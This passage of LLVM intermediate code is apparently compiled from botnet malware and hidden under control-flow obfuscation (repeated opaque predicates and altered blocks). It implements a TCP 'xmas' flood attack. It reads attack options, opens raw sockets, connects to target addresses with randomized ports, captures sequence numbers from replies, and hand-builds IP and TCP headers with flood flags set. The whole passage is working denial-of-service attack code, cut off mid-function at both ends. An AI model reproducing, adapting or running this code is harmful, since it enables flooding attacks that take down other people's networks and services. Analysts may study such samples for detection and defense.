  %58 = call i32 @attack_get_opt_int(i8 zeroext %56, %struct.attack_option* %57, i8 zeroext 3, i32 65535)
  %59 = trunc i32 %58 to i16
  store i16 %59, i16* %14, align 2
  %60 = load i8, i8* %7, align 1
  %61 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %62 = call i32 @attack_get_opt_int(i8 zeroext %60, %struct.attack_option* %61, i8 zeroext 4, i32 64)
  %63 = trunc i32 %62 to i8
  store i8 %63, i8* %15, align 1
  %64 = load i8, i8* %7, align 1
  %65 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %66 = call i32 @attack_get_opt_int(i8 zeroext %64, %struct.attack_option* %65, i8 zeroext 5, i32 1)
  %67 = trunc i32 %66 to i8
  store i8 %67, i8* %16, align 1
  %68 = load i8, i8* %7, align 1
  %69 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %70 = call i32 @attack_get_opt_int(i8 zeroext %68, %struct.attack_option* %69, i8 zeroext 7, i32 65535)
  %71 = trunc i32 %70 to i16
  store i16 %71, i16* %17, align 2
  %72 = load i8, i8* %7, align 1
  %73 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %74 = call i32 @attack_get_opt_int(i8 zeroext %72, %struct.attack_option* %73, i8 zeroext 11, i32 0)
  %75 = trunc i32 %74 to i8
  store i8 %75, i8* %18, align 1
  %76 = load i8, i8* %7, align 1
  %77 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %78 = call i32 @attack_get_opt_int(i8 zeroext %76, %struct.attack_option* %77, i8 zeroext 12, i32 1)
  %79 = trunc i32 %78 to i8
  store i8 %79, i8* %19, align 1
  %80 = load i8, i8* %7, align 1
  %81 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %82 = call i32 @attack_get_opt_int(i8 zeroext %80, %struct.attack_option* %81, i8 zeroext 13, i32 1)
  %83 = trunc i32 %82 to i8
  store i8 %83, i8* %20, align 1
  %84 = load i8, i8* %7, align 1
  %85 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %86 = call i32 @attack_get_opt_int(i8 zeroext %84, %struct.attack_option* %85, i8 zeroext 14, i32 0)
  %87 = trunc i32 %86 to i8
  store i8 %87, i8* %21, align 1
  %88 = load i8, i8* %7, align 1
  %89 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %90 = call i32 @attack_get_opt_int(i8 zeroext %88, %struct.attack_option* %89, i8 zeroext 15, i32 0)
  %91 = trunc i32 %90 to i8
  store i8 %91, i8* %22, align 1
  %92 = load i8, i8* %7, align 1
  %93 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %94 = call i32 @attack_get_opt_int(i8 zeroext %92, %struct.attack_option* %93, i8 zeroext 16, i32 0)
  %95 = trunc i32 %94 to i8
  store i8 %95, i8* %23, align 1
  %96 = load i8, i8* %7, align 1
  %97 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %98 = call i32 @attack_get_opt_int(i8 zeroext %96, %struct.attack_option* %97, i8 zeroext 0, i32 768)
  store i32 %98, i32* %24, align 4
  %99 = load i8, i8* %7, align 1
  %100 = load %struct.attack_option*, %struct.attack_option** %8, align 8
  %101 = call i32 @attack_get_opt_int(i8 zeroext %99, %struct.attack_option* %100, i8 zeroext 1, i32 1)
  %102 = trunc i32 %101 to i8
  store i8 %102, i8* %25, align 1
  %103 = call i32 @socket(i32 2, i32 3, i32 6) #7
  store i32 %103, i32* %10, align 4
  %104 = icmp eq i32 %103, -1
  br i1 %104, label %105, label %106

; <label>:105:                                    ; preds = %4
  br label %863

; <label>:106:                                    ; preds = %4
  %107 = load i32, i32* @x.29
  %108 = load i32, i32* @y.30
  %109 = sub i32 %107, 1
  %110 = mul i32 %107, %109
  %111 = urem i32 %110, 2
  %112 = icmp eq i32 %111, 0
  %113 = icmp slt i32 %108, 10
  %114 = or i1 %112, %113
  br i1 %114, label %originalBB, label %originalBBalteredBB

originalBB:                                       ; preds = %originalBBalteredBB, %106
  store i32 1, i32* %9, align 4
  %115 = load i32, i32* %10, align 4
  %116 = bitcast i32* %9 to i8*
  %117 = call i32 @setsockopt(i32 %115, i32 0, i32 3, i8* %116, i32 4) #7
  %118 = icmp eq i32 %117, -1
  %119 = load i32, i32* @x.29
  %120 = load i32, i32* @y.30
  %121 = sub i32 %119, 1
  %122 = mul i32 %119, %121
  %123 = urem i32 %122, 2
  %124 = icmp eq i32 %123, 0
  %125 = icmp slt i32 %120, 10
  %126 = or i1 %124, %125
  br i1 %126, label %originalBBpart2, label %originalBBalteredBB

originalBBpart2:                                  ; preds = %originalBB
  br i1 %118, label %127, label %130

; <label>:127:                                    ; preds = %originalBBpart2
  %128 = load i32, i32* %10, align 4
  %129 = call i32 @close(i32 %128)
  br label %863

; <label>:130:                                    ; preds = %originalBBpart2
  store i32 0, i32* %9, align 4
  br label %131

; <label>:131:                                    ; preds = %684, %130
  %132 = load i32, i32* @x.29
  %133 = load i32, i32* @y.30
  %134 = sub i32 %132, 1
  %135 = mul i32 %132, %134
  %136 = urem i32 %135, 2
  %137 = icmp eq i32 %136, 0
  %138 = icmp slt i32 %133, 10
  %139 = or i1 %137, %138
  br i1 %139, label %originalBB1, label %originalBB1alteredBB

originalBB1:                                      ; preds = %originalBB1alteredBB, %131
  %140 = load i32, i32* %9, align 4
  %141 = load i8, i8* %5, align 1
  %142 = zext i8 %141 to i32
  %143 = icmp slt i32 %140, %142
  %144 = load i32, i32* @x.29
  %145 = load i32, i32* @y.30
  %146 = sub i32 %144, 1
  %147 = mul i32 %144, %146
  %148 = urem i32 %147, 2
  %149 = icmp eq i32 %148, 0
  %150 = icmp slt i32 %145, 10
  %151 = or i1 %149, %150
  br i1 %151, label %originalBBpart24, label %originalBB1alteredBB

originalBBpart24:                                 ; preds = %originalBB1
  br i1 %143, label %152, label %687

; <label>:152:                                    ; preds = %originalBBpart24
  br label %153

; <label>:153:                                    ; preds = %originalBBpart263, %604, %152
  %154 = load i32, i32* @x.29
  %155 = load i32, i32* @y.30
  %156 = sub i32 %154, 1
  %157 = mul i32 %154, %156
  %158 = urem i32 %157, 2
  %159 = icmp eq i32 %158, 0
  %160 = icmp slt i32 %155, 10
  %161 = or i1 %159, %160
  br i1 %161, label %originalBB6, label %originalBB6alteredBB

originalBB6:                                      ; preds = %originalBB6alteredBB, %153
  %162 = call i32 @socket(i32 2, i32 1, i32 0) #7
  store i32 %162, i32* %26, align 4
  %163 = icmp eq i32 %162, -1
  %164 = load i32, i32* @x.29
  %165 = load i32, i32* @y.30
  %166 = sub i32 %164, 1
  %167 = mul i32 %164, %166
  %168 = urem i32 %167, 2
  %169 = icmp eq i32 %168, 0
  %170 = icmp slt i32 %165, 10
  %171 = or i1 %169, %170
  br i1 %171, label %originalBBpart28, label %originalBB6alteredBB

originalBBpart28:                                 ; preds = %originalBB6
  br i1 %163, label %172, label %173

; <label>:172:                                    ; preds = %originalBBpart28
  br label %684

; <label>:173:                                    ; preds = %originalBBpart28
  %174 = load i32, i32* %26, align 4
  %175 = load i32, i32* %26, align 4
  %176 = call i32 (i32, i32, ...) @fcntl(i32 %175, i32 3, i32 0)
  %177 = or i32 %176, 2048
  %178 = call i32 (i32, i32, ...) @fcntl(i32 %174, i32 4, i32 %177)
  %179 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 0
  store i16 2, i16* %179, align 4
  %180 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %181 = load i32, i32* %9, align 4
  %182 = sext i32 %181 to i64
  %183 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %180, i64 %182
  %184 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %183, i32 0, i32 2
  %185 = load i8, i8* %184, align 4
  %186 = zext i8 %185 to i32
  %187 = icmp slt i32 %186, 32
  br i1 %187, label %188, label %209

; <label>:188:                                    ; preds = %173
  %189 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %190 = load i32, i32* %9, align 4
  %191 = sext i32 %190 to i64
  %192 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %189, i64 %191
  %193 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %192, i32 0, i32 1
  %194 = load i32, i32* %193, align 4
  %195 = call i32 @ntohl(i32 %194) #8
  %196 = call i32 @rand_next()
  %197 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %198 = load i32, i32* %9, align 4
  %199 = sext i32 %198 to i64
  %200 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %197, i64 %199
  %201 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %200, i32 0, i32 2
  %202 = load i8, i8* %201, align 4
  %203 = zext i8 %202 to i32
  %204 = lshr i32 %196, %203
  %205 = add i32 %195, %204
  %206 = call i32 @htonl(i32 %205) #8
  %207 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %208 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %207, i32 0, i32 0
  store i32 %206, i32* %208, align 4
  br label %234

; <label>:209:                                    ; preds = %173
  %210 = load i32, i32* @x.29
  %211 = load i32, i32* @y.30
  %212 = sub i32 %210, 1
  %213 = mul i32 %210, %212
  %214 = urem i32 %213, 2
  %215 = icmp eq i32 %214, 0
  %216 = icmp slt i32 %211, 10
  %217 = or i1 %215, %216
  br i1 %217, label %originalBB10, label %originalBB10alteredBB

originalBB10:                                     ; preds = %originalBB10alteredBB, %209
  %218 = load %struct.attack_target*, %struct.attack_target** %6, align 8
  %219 = load i32, i32* %9, align 4
  %220 = sext i32 %219 to i64
  %221 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %218, i64 %220
  %222 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %221, i32 0, i32 1
  %223 = load i32, i32* %222, align 4
  %224 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %225 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %224, i32 0, i32 0
  store i32 %223, i32* %225, align 4
  %226 = load i32, i32* @x.29
  %227 = load i32, i32* @y.30
  %228 = sub i32 %226, 1
  %229 = mul i32 %226, %228
  %230 = urem i32 %229, 2
  %231 = icmp eq i32 %230, 0
  %232 = icmp slt i32 %227, 10
  %233 = or i1 %231, %232
  br i1 %233, label %originalBBpart212, label %originalBB10alteredBB

originalBBpart212:                                ; preds = %originalBB10
  br label %234

; <label>:234:                                    ; preds = %originalBBpart212, %188
  %235 = load i16, i16* %17, align 2
  %236 = zext i16 %235 to i32
  %237 = icmp eq i32 %236, 65535
  br i1 %237, label %238, label %243

; <label>:238:                                    ; preds = %234
  %239 = call i32 @rand_next()
  %240 = and i32 %239, 65535
  %241 = trunc i32 %240 to i16
  %242 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %241, i16* %242, align 2
  br label %263

; <label>:243:                                    ; preds = %234
  %244 = load i32, i32* @x.29
  %245 = load i32, i32* @y.30
  %246 = sub i32 %244, 1
  %247 = mul i32 %244, %246
  %248 = urem i32 %247, 2
  %249 = icmp eq i32 %248, 0
  %250 = icmp slt i32 %245, 10
  %251 = or i1 %249, %250
  br i1 %251, label %originalBB14, label %originalBB14alteredBB

originalBB14:                                     ; preds = %originalBB14alteredBB, %243
  %252 = load i16, i16* %17, align 2
  %253 = call zeroext i16 @htons(i16 zeroext %252) #8
  %254 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  store i16 %253, i16* %254, align 2
  %255 = load i32, i32* @x.29
  %256 = load i32, i32* @y.30
  %257 = sub i32 %255, 1
  %258 = mul i32 %255, %257
  %259 = urem i32 %258, 2
  %260 = icmp eq i32 %259, 0
  %261 = icmp slt i32 %256, 10
  %262 = or i1 %260, %261
  br i1 %262, label %originalBBpart216, label %originalBB14alteredBB

originalBBpart216:                                ; preds = %originalBB14
  br label %263

; <label>:263:                                    ; preds = %originalBBpart216, %238
  %264 = load i32, i32* %26, align 4
  %265 = bitcast %union.__CONST_SOCKADDR_ARG* %32 to %struct.sockaddr**
  %266 = bitcast %struct.sockaddr_in* %27 to %struct.sockaddr*
  store %struct.sockaddr* %266, %struct.sockaddr** %265, align 8
  %267 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %32, i32 0, i32 0
  %268 = load %struct.sockaddr*, %struct.sockaddr** %267, align 8
  %269 = call i32 @connect(i32 %264, %struct.sockaddr* %268, i32 16)
  %270 = call i64 @time(i64* null) #7
  store i64 %270, i64* %31, align 8
  br label %271

; <label>:271:                                    ; preds = %666, %263
  store i32 16, i32* %29, align 4
  %272 = load i32, i32* %10, align 4
  %273 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %274 = bitcast %union.__CONST_SOCKADDR_ARG* %34 to %struct.sockaddr**
  %275 = bitcast %struct.sockaddr_in* %28 to %struct.sockaddr*
  store %struct.sockaddr* %275, %struct.sockaddr** %274, align 8
  %276 = getelementptr inbounds %union.__CONST_SOCKADDR_ARG, %union.__CONST_SOCKADDR_ARG* %34, i32 0, i32 0
  %277 = load %struct.sockaddr*, %struct.sockaddr** %276, align 8
  %278 = call i64 @recvfrom(i32 %272, i8* %273, i64 256, i32 16384, %struct.sockaddr* %277, i32* %29)
  %279 = trunc i64 %278 to i32
  store i32 %279, i32* %33, align 4
  %280 = load i32, i32* %33, align 4
  %281 = icmp eq i32 %280, -1
  br i1 %281, label %282, label %283

; <label>:282:                                    ; preds = %271
  br label %863

; <label>:283:                                    ; preds = %271
  %284 = load i32, i32* @x.29
  %285 = load i32, i32* @y.30
  %286 = sub i32 %284, 1
  %287 = mul i32 %284, %286
  %288 = urem i32 %287, 2
  %289 = icmp eq i32 %288, 0
  %290 = icmp slt i32 %285, 10
  %291 = or i1 %289, %290
  br i1 %291, label %originalBB18, label %originalBB18alteredBB

originalBB18:                                     ; preds = %originalBB18alteredBB, %283
  %292 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %28, i32 0, i32 2
  %293 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %292, i32 0, i32 0
  %294 = load i32, i32* %293, align 4
  %295 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %296 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %295, i32 0, i32 0
  %297 = load i32, i32* %296, align 4
  %298 = icmp eq i32 %294, %297
  %299 = load i32, i32* @x.29
  %300 = load i32, i32* @y.30
  %301 = sub i32 %299, 1
  %302 = mul i32 %299, %301
  %303 = urem i32 %302, 2
  %304 = icmp eq i32 %303, 0
  %305 = icmp slt i32 %300, 10
  %306 = or i1 %304, %305
  br i1 %306, label %originalBBpart220, label %originalBB18alteredBB

originalBBpart220:                                ; preds = %originalBB18
  br i1 %298, label %307, label %626

; <label>:307:                                    ; preds = %originalBBpart220
  %308 = load i32, i32* %33, align 4
  %309 = sext i32 %308 to i64
  %310 = icmp ugt i64 %309, 40
  br i1 %310, label %311, label %626

; <label>:311:                                    ; preds = %307
  %312 = load i32, i32* @x.29
  %313 = load i32, i32* @y.30
  %314 = sub i32 %312, 1
  %315 = mul i32 %312, %314
  %316 = urem i32 %315, 2
  %317 = icmp eq i32 %316, 0
  %318 = icmp slt i32 %313, 10
  %319 = or i1 %317, %318
  br i1 %319, label %originalBB22, label %originalBB22alteredBB

originalBB22:                                     ; preds = %originalBB22alteredBB, %311
  %320 = getelementptr inbounds [256 x i8], [256 x i8]* %30, i32 0, i32 0
  %321 = getelementptr inbounds i8, i8* %320, i64 20
  %322 = bitcast i8* %321 to %struct.tcphdr*
  store %struct.tcphdr* %322, %struct.tcphdr** %35, align 8
  %323 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %324 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %323, i32 0, i32 0
  %325 = load i16, i16* %324, align 4
  %326 = zext i16 %325 to i32
  %327 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %328 = load i16, i16* %327, align 2
  %329 = zext i16 %328 to i32
  %330 = icmp eq i32 %326, %329
  %331 = load i32, i32* @x.29
  %332 = load i32, i32* @y.30
  %333 = sub i32 %331, 1
  %334 = mul i32 %331, %333
  %335 = urem i32 %334, 2
  %336 = icmp eq i32 %335, 0
  %337 = icmp slt i32 %332, 10
  %338 = or i1 %336, %337
  br i1 %338, label %originalBBpart224, label %originalBB22alteredBB

originalBBpart224:                                ; preds = %originalBB22
  br i1 %330, label %339, label %625

; <label>:339:                                    ; preds = %originalBBpart224
  %340 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %341 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %340, i32 0, i32 4
  %342 = load i16, i16* %341, align 4
  %343 = lshr i16 %342, 9
  %344 = and i16 %343, 1
  %345 = zext i16 %344 to i32
  %346 = icmp ne i32 %345, 0
  br i1 %346, label %347, label %588

; <label>:347:                                    ; preds = %339
  %348 = load i32, i32* @x.29
  %349 = load i32, i32* @y.30
  %350 = sub i32 %348, 1
  %351 = mul i32 %348, %350
  %352 = urem i32 %351, 2
  %353 = icmp eq i32 %352, 0
  %354 = icmp slt i32 %349, 10
  %355 = or i1 %353, %354
  br i1 %355, label %originalBB26, label %originalBB26alteredBB

originalBB26:                                     ; preds = %originalBB26alteredBB, %347
  %356 = load %struct.tcphdr*, %struct.tcphdr** %35, align 8
  %357 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %356, i32 0, i32 4
  %358 = load i16, i16* %357, align 4
  %359 = lshr i16 %358, 12
  %360 = and i16 %359, 1
  %361 = zext i16 %360 to i32
  %362 = icmp ne i32 %361, 0
  %363 = load i32, i32* @x.29
  %364 = load i32, i32* @y.30
  %365 = sub i32 %363, 1
  %366 = mul i32 %363, %365
  %367 = urem i32 %366, 2
  %368 = icmp eq i32 %367, 0
  %369 = icmp slt i32 %364, 10
  %370 = or i1 %368, %369
  br i1 %370, label %originalBBpart237, label %originalBB26alteredBB

originalBBpart237:                                ; preds = %originalBB26
  br i1 %362, label %371, label %588

; <label>:371:                                    ; preds = %originalBBpart237
  %372 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 2
  %373 = getelementptr inbounds %struct.in_addr, %struct.in_addr* %372, i32 0, i32 0
  %374 = load i32, i32* %373, align 4
  %375 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %376 = load i32, i32* %9, align 4
  %377 = sext i32 %376 to i64
  %378 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %375, i64 %377
  %379 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %378, i32 0, i32 0
  store i32 %374, i32* %379, align 4
  %380 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %381 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %380, i32 0, i32 2
  %382 = load i32, i32* %381, align 4
  %383 = call i32 @ntohl(i32 %382) #8
  %384 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %385 = load i32, i32* %9, align 4
  %386 = sext i32 %385 to i64
  %387 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %384, i64 %386
  %388 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %387, i32 0, i32 1
  store i32 %383, i32* %388, align 4
  %389 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %390 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %389, i32 0, i32 3
  %391 = load i32, i32* %390, align 4
  %392 = call i32 @ntohl(i32 %391) #8
  %393 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %394 = load i32, i32* %9, align 4
  %395 = sext i32 %394 to i64
  %396 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %393, i64 %395
  %397 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %396, i32 0, i32 2
  store i32 %392, i32* %397, align 4
  %398 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %399 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %398, i32 0, i32 1
  %400 = load i16, i16* %399, align 2
  %401 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %402 = load i32, i32* %9, align 4
  %403 = sext i32 %402 to i64
  %404 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %401, i64 %403
  %405 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %404, i32 0, i32 3
  store i16 %400, i16* %405, align 4
  %406 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %27, i32 0, i32 1
  %407 = load i16, i16* %406, align 2
  %408 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %409 = load i32, i32* %9, align 4
  %410 = sext i32 %409 to i64
  %411 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %408, i64 %410
  %412 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %411, i32 0, i32 4
  store i16 %407, i16* %412, align 2
  %413 = load i32, i32* %24, align 4
  %414 = sext i32 %413 to i64
  %415 = add i64 40, %414
  %416 = call noalias i8* @malloc(i64 %415) #7
  %417 = load i8**, i8*** %12, align 8
  %418 = load i32, i32* %9, align 4
  %419 = sext i32 %418 to i64
  %420 = getelementptr inbounds i8*, i8** %417, i64 %419
  store i8* %416, i8** %420, align 8
  %421 = load i8**, i8*** %12, align 8
  %422 = load i32, i32* %9, align 4
  %423 = sext i32 %422 to i64
  %424 = getelementptr inbounds i8*, i8** %421, i64 %423
  %425 = load i8*, i8** %424, align 8
  %426 = bitcast i8* %425 to %struct.iphdr*
  store %struct.iphdr* %426, %struct.iphdr** %36, align 8
  %427 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %428 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %427, i64 1
  %429 = bitcast %struct.iphdr* %428 to %struct.tcphdr*
  store %struct.tcphdr* %429, %struct.tcphdr** %37, align 8
  %430 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %431 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %430, i64 1
  %432 = bitcast %struct.tcphdr* %431 to i8*
  store i8* %432, i8** %38, align 8
  %433 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %434 = bitcast %struct.iphdr* %433 to i8*
  %435 = load i8, i8* %434, align 4
  %436 = and i8 %435, 15
  %437 = or i8 %436, 64
  store i8 %437, i8* %434, align 4
  %438 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %439 = bitcast %struct.iphdr* %438 to i8*
  %440 = load i8, i8* %439, align 4
  %441 = and i8 %440, -16
  %442 = or i8 %441, 5
  store i8 %442, i8* %439, align 4
  %443 = load i8, i8* %13, align 1
  %444 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %445 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %444, i32 0, i32 1
  store i8 %443, i8* %445, align 1
  %446 = load i32, i32* %24, align 4
  %447 = sext i32 %446 to i64
  %448 = add i64 40, %447
  %449 = trunc i64 %448 to i16
  %450 = call zeroext i16 @htons(i16 zeroext %449) #8
  %451 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %452 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %451, i32 0, i32 2
  store i16 %450, i16* %452, align 2
  %453 = load i16, i16* %14, align 2
  %454 = call zeroext i16 @htons(i16 zeroext %453) #8
  %455 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %456 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %455, i32 0, i32 3
  store i16 %454, i16* %456, align 4
  %457 = load i8, i8* %15, align 1
  %458 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %459 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %458, i32 0, i32 5
  store i8 %457, i8* %459, align 4
  %460 = load i8, i8* %16, align 1
  %461 = icmp ne i8 %460, 0
  br i1 %461, label %462, label %466

; <label>:462:                                    ; preds = %371
  %463 = call zeroext i16 @htons(i16 zeroext 16384) #8
  %464 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %465 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %464, i32 0, i32 4
  store i16 %463, i16* %465, align 2
  br label %466

; <label>:466:                                    ; preds = %462, %371
  %467 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %468 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %467, i32 0, i32 6
  store i8 6, i8* %468, align 1
  %469 = load i32, i32* @LOCAL_ADDR, align 4
  %470 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %471 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %470, i32 0, i32 8
  store i32 %469, i32* %471, align 4
  %472 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %473 = load i32, i32* %9, align 4
  %474 = sext i32 %473 to i64
  %475 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %472, i64 %474
  %476 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %475, i32 0, i32 0
  %477 = load i32, i32* %476, align 4
  %478 = load %struct.iphdr*, %struct.iphdr** %36, align 8
  %479 = getelementptr inbounds %struct.iphdr, %struct.iphdr* %478, i32 0, i32 9
  store i32 %477, i32* %479, align 4
  %480 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %481 = load i32, i32* %9, align 4
  %482 = sext i32 %481 to i64
  %483 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %480, i64 %482
  %484 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %483, i32 0, i32 3
  %485 = load i16, i16* %484, align 4
  %486 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %487 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %486, i32 0, i32 0
  store i16 %485, i16* %487, align 4
  %488 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %489 = load i32, i32* %9, align 4
  %490 = sext i32 %489 to i64
  %491 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %488, i64 %490
  %492 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %491, i32 0, i32 4
  %493 = load i16, i16* %492, align 2
  %494 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %495 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %494, i32 0, i32 1
  store i16 %493, i16* %495, align 2
  %496 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %497 = load i32, i32* %9, align 4
  %498 = sext i32 %497 to i64
  %499 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %496, i64 %498
  %500 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %499, i32 0, i32 2
  %501 = load i32, i32* %500, align 4
  %502 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %503 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %502, i32 0, i32 2
  store i32 %501, i32* %503, align 4
  %504 = load %struct.attack_xmas_data*, %struct.attack_xmas_data** %11, align 8
  %505 = load i32, i32* %9, align 4
  %506 = sext i32 %505 to i64
  %507 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %504, i64 %506
  %508 = getelementptr inbounds %struct.attack_xmas_data, %struct.attack_xmas_data* %507, i32 0, i32 1
  %509 = load i32, i32* %508, align 4
  %510 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %511 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %510, i32 0, i32 3
  store i32 %509, i32* %511, align 4
  %512 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %513 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %512, i32 0, i32 4
  %514 = load i16, i16* %513, align 4
  %515 = and i16 %514, -241
  %516 = or i16 %515, 128
  store i16 %516, i16* %513, align 4
  %517 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %518 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %517, i32 0, i32 4
  %519 = load i16, i16* %518, align 4
  %520 = and i16 %519, -257
  %521 = or i16 %520, 256
  store i16 %521, i16* %518, align 4
  %522 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %523 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %522, i32 0, i32 4
  %524 = load i16, i16* %523, align 4
  %525 = and i16 %524, -4097
  %526 = or i16 %525, 4096
  store i16 %526, i16* %523, align 4
  %527 = call i32 @rand_next()
  %528 = and i32 %527, 65535
  %529 = trunc i32 %528 to i16
  %530 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %531 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %530, i32 0, i32 5
  store i16 %529, i16* %531, align 2
  %532 = load i8, i8* %18, align 1
  %533 = sext i8 %532 to i16
  %534 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %535 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %534, i32 0, i32 4
  %536 = load i16, i16* %535, align 4
  %537 = and i16 %533, 1
  %538 = shl i16 %537, 13
  %539 = and i16 %536, -8193
  %540 = or i16 %539, %538
  store i16 %540, i16* %535, align 4
  %541 = load i8, i8* %19, align 1
  %542 = sext i8 %541 to i16
  %543 = load %struct.tcphdr*, %struct.tcphdr** %37, align 8
  %544 = getelementptr inbounds %struct.tcphdr, %struct.tcphdr* %543, i32 0, i32 4
  %545 = load i16, i16* %544, align 4
  %546 = and i16 %542, 1
  %547 = shl i16 %546, 12
  %548 = and i16 %545, -4097
